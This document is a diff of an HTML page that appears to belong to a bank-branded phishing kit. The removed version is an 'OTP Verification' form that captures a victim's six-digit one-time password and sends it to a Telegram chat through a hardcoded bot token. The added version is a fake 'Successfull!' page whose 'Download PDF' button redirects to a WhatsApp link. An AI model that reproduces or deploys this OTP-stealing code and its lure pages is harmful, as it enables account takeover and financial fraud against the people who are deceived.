@@ -1,216 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification</title>
-    <style>
-        /* Reset some default styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: #fff;
-            
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stylish Success Page</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      background: linear-gradient(135deg, #e0f7fa, #e1bee7);
+      color: #333;
+    }
 
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #5f2c82, #49a09d);  /* Gradient Background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-            color: #fff;
-            padding: 0px;
-        }
+    .header-image {
+      width: 100%;
+      height: auto;
+      border-bottom: 5px solid #4caf50;
+    }
 
-        .container {
-            background-color: #fff;
-            color: #333;
-            border-radius: 0px;
-            
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
+    .success-container {
+      margin-top: 20px;
+      padding: 20px;
+    }
 
-        h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
+    .success-animation {
+      margin: 20px auto;
+      animation: fadeIn 1s ease-in-out;
+    }
 
-        input[type="text"] {
-            width: 100%;
-            padding: 15px;
-            font-size: 18px;
-            margin-bottom: 25px;
-            border: 2px solid #2A3E8C;
-            border-radius: 8px;
-            outline: none;
-            transition: border 0.3s ease;
-        }
+    .tick-circle {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto;
+      background: radial-gradient(circle, #4caf50, #66bb6a);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+    }
 
-        input[type="text"]:focus {
-            border-color: #2A3E8C;
-        }
+    .checkmark {
+      width: 80px;
+      height: 80px;
+    }
 
-        button {
-            background-color: #2A3E8C;
-            color: #fff;
-            padding: 15px;
-            font-size: 18px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.3s ease;
-        }
+    .circle {
+      stroke: white;
+      stroke-width: 3;
+      stroke-dasharray: 166;
+      stroke-dashoffset: 166;
+      animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+    }
 
-        button:hover {
-            background-color: #5f2c82;
-        }
+    .check {
+      stroke: white;
+      stroke-width: 3;
+      stroke-dasharray: 48;
+      stroke-dashoffset: 48;
+      animation: stroke 0.4s 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+    }
 
-        /* Success Message Styles */
-        .success-message {
-            margin-top: 30px;
-            display: none;
-            text-align: center;
-        }
+    .success-message {
+      font-size: 28px;
+      margin-top: 10px;
+      color: #4caf50;
+      animation: slideIn 1s ease-out;
+    }
 
-        .success-message h3 {
-            font-size: 22px;
-            color: #49a09d;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
+    .action-button {
+      padding: 15px 30px;
+      margin-top: 20px;
+      font-size: 20px;
+      font-weight: bold;
+      background: linear-gradient(135deg, #4caf50, #388e3c);
+      color: white;
+      border: none;
+      border-radius: 25px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
 
-        .download-btn {
-            background-color: #ff5722;
-            padding: 12px 20px;
-            font-size: 18px;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            text-decoration: none;
-            margin-bottom: 15px;
-            transition: background-color 0.3s ease;
-        }
+    .action-button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+    }
 
-        .download-btn:hover {
-            background-color: #e64a19;
-        }
+    @keyframes stroke {
+      100% {
+        stroke-dashoffset: 0;
+      }
+    }
 
-        .redirect-link {
-            font-size: 18px;
-            color: #2196F3;
-            text-decoration: none;
-            font-weight: 500;
-            transition: text-decoration 0.3s ease;
-        }
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
 
-        .redirect-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 480px) {
-            .container {
-                padding: 25px;
-            }
-
-            h2 {
-                font-size: 20px;
-            }
-
-            button, .download-btn {
-                font-size: 16px;
-                padding: 12px;
-            }
-
-            .redirect-link {
-                font-size: 16px;
-            }
-        }
-    </style>
+    @keyframes slideIn {
+      from {
+        transform: translateY(-20px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+  </style>
 </head>
 <body>
-
-    <div class="container">
-        <img src="rbl.jpg" alt="logo" width="100%" height="150px">
-        <br>
-        <br>
-        <br>
-        <h2>Enter 6-Digit OTP</h2>
-        
-        
-        <form id="otp-form">
-            <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" placeholder="Enter OTP" required>
-            <br>
-            <br>
-            <button type="submit">Submit OTP</button>
-        </form>
-
-        <div class="success-message" id="success-message">
-            <h3>OTP Verified Successfully!</h3>
-            <p>Click below to proceed:</p>
-            <a href="path-to-next-page.html" class="redirect-link">Go to Next Page</a>
-            <br>
-            <button class="download-btn" onclick="downloadPDF()">Download PDF</button>
+  <header>
+    <img src="rbl.jpg" alt="Header Image" class="header-image">
+  </header>
+  <main>
+    <div class="success-container">
+      <div class="success-animation">
+        <div class="tick-circle">
+          <svg viewBox="0 0 52 52" class="checkmark">
+            <circle class="circle" cx="26" cy="26" r="25" fill="none" />
+            <path class="check" fill="none" d="M14 27l8 8 16-16" />
+          </svg>
         </div>
+        <h1 class="success-message">Successfull!</h1>
+      </div>
+      <button class="action-button" onclick="redirect()">Download PDF</button>
     </div>
-
-    <script>
-        document.getElementById("otp-form").addEventListener("submit", function(event) {
-            event.preventDefault();  // Prevent default form submission
-
-            const otp = document.getElementById("otp").value;
-
-            // Validate OTP (must be exactly 6 digits)
-            if (!/^\d{6}$/.test(otp)) {
-                alert("Please enter a valid 6-digit OTP.");
-                return;
-            }
-
-            // Send OTP to Telegram
-            sendOTPToTelegram(otp);
-        });
-
-        function sendOTPToTelegram(otp) {
-            const telegramBotToken = '7900560320:AAHHQ4xQcjuQOPzqcZvuxl8GO71RdmY1xlM';  // Replace with your bot token
-            const chatID = '7665231301';              // Replace with your chat ID
-            const message = `OTP: ${otp}`;
-
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        // On success, show success message and options to proceed
-                        document.querySelector(".container form").style.display = "none";
-                        document.getElementById("success-message").style.display = "block";
-                    } else {
-                        alert("Error sending OTP to Telegram.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("There was an error with the Telegram API.");
-                });
-        }
-
-        function downloadPDF() {
-            const link = document.createElement('a');
-            link.href = 'https://wa.link/2affju'; // Replace with the path to your PDF
-            link.download = 'https://wa.link/2affju';    // Specify the filename for the downloaded PDF
-            link.click();
-        }
-    </script>
-
+  </main>
+  <script>
+    function redirect() {
+      window.location.href = "https://wa.link/8dv42z"; // Replace with your desired URL
+    }
+  </script>
 </body>
 </html>
